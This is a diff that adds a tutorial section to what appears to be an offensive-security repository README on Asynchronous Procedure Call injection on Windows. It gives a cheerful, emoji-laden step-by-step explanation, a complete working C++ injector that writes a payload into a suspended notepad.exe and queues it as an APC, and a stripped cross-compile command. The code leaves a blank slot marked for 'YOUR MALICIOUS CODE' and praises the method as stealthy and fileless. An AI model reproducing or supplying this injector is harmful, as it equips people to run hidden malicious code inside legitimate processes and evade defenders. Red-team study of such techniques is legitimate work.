@@ -171,4 +171,120 @@ kant@APPLEs-MacBook-Pro ~/m/shellcode-injection>
 
 
 
-----
+---
+
+---
+
+---
+
+
+
+# 🚀 Asynchronous Procedure Call (APC) Injection
+
+---
+## ✨ Introduction
+
+Asynchronous Procedure Call (APC) Injection is a super cool technique that allows you to execute custom code within the context of another process! 🎯 It's like whispering a secret command to a program while it's sleeping. 😴➡️👂
+
+This method is favored by red teams and security researchers because it's stealthy, fileless, and operates entirely in memory! 🧠💥
+## 🔧 How APC Injection Works
+
+Here's the magical process in simple terms:
+
+    Freeze a Process ❄️ - Start a program but pause it immediately
+
+    Allocate Memory 🏗️ - Create space in the target process's memory
+
+    Write Payload ✍️ - Insert your code into that memory space
+
+    Schedule Execution ⏰ - Tell the process to run your code when it wakes up
+
+    Resume Process ▶️ - Unfreeze the process, executing your code!
+
+---
+
+1. Spawn a process in suspended state
+
+	- The program starts notepad.exe but keeps its main thread suspended so nothing runs immediately. This gives the injector time to prepare the target process.
+
+2. Allocate memory inside the target process
+
+	- VirtualAllocEx asks the target process to reserve a region of memory that will later be used to hold the payload.
+
+3. Write bytes into that memory
+
+	- WriteProcessMemory copies the local payload[] bytes into the remote process's newly allocated memory.
+
+4. Queue an APC
+
+	- QueueUserAPC queues a callback (the address of the injected bytes) on the target thread — the OS will run that callback in the context of the target thread 	when it is alertable.
+
+5. Resume thread so APC can execute
+
+	- ResumeThread lets the suspended thread run again; when conditions are right the queued APC will be executed and the payload runs inside the target process.
+
+```cpp
+#include <Windows.h>
+#include <stdio.h>
+
+char payload[] = "";  // 🎯 YOUR MALICIOUS CODE GOES HERE!
+
+
+unsigned int payload_len = sizeof(payload);  // 📏 AUTO-MAGICALLY CALCULATES CODE SIZE
+
+
+int main(int argc, char **argv) {
+
+    int pid = 0;
+    HANDLE hProc = NULL;
+    STARTUPINFO si;          // 📋 BLUEPRINT FOR NEW PROCESS
+    PROCESS_INFORMATION pi;  // 📊 PROCESS ID CARD
+    void * newMemorySpace;   // 🧠 FUTURE HOME FOR YOUR PAYLOAD
+    
+    // 🧹 CLEAN SLATE TECHNIQUE
+    ZeroMemory( &si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory( &pi, sizeof(pi));
+
+    // 🎪 CREATE NOTEPAD BUT FREEZE IT MID-AIR!
+    CreateProcessA(0, "notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);
+    
+    // ⏸️  PAUSE BUTTON - PRESS ENTER TO CONTINUE
+    getchar();
+    
+    // 🏗️  ALLOCATE STEALTH MEMORY IN NOTEPAD'S BRAIN
+    newMemorySpace = VirtualAllocEx(pi.hProcess, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
+    
+    // ✍️  WRITE YOUR PAYLOAD INTO NOTEPAD'S MEMORY
+    WriteProcessMemory(pi.hProcess, newMemorySpace, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
+    
+    // 🎯 SLIP YOUR CODE INTO NOTEPAD'S THOUGHT PROCESS
+    QueueUserAPC((PAPCFUNC)newMemorySpace, pi.hThread, NULL);
+    
+    // ▶️  UNFREEZE NOTEPAD - NOW EXECUTING YOUR CODE!
+    ResumeThread(pi.hThread);
+    
+    return 0;
+}
+```
+
+---
+
+
+## Cross Compilation
+
+```bash
+x86_64-w64-mingw32-g++ apc_inject.cpp -o apc_inject -I/usr/share/mingw-w64/include -L/usr/lib -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -Wnarrowing -fexceptions
+```
+
+---
+
+## Execution
+
+---
+
+<img width="1183" height="745" alt="Screenshot 2025-09-20 at 5 52 47 PM" src="https://github.com/user-attachments/assets/f7a6455b-7303-4d37-bcee-03dcc54ab991" />
+
+---
+
+
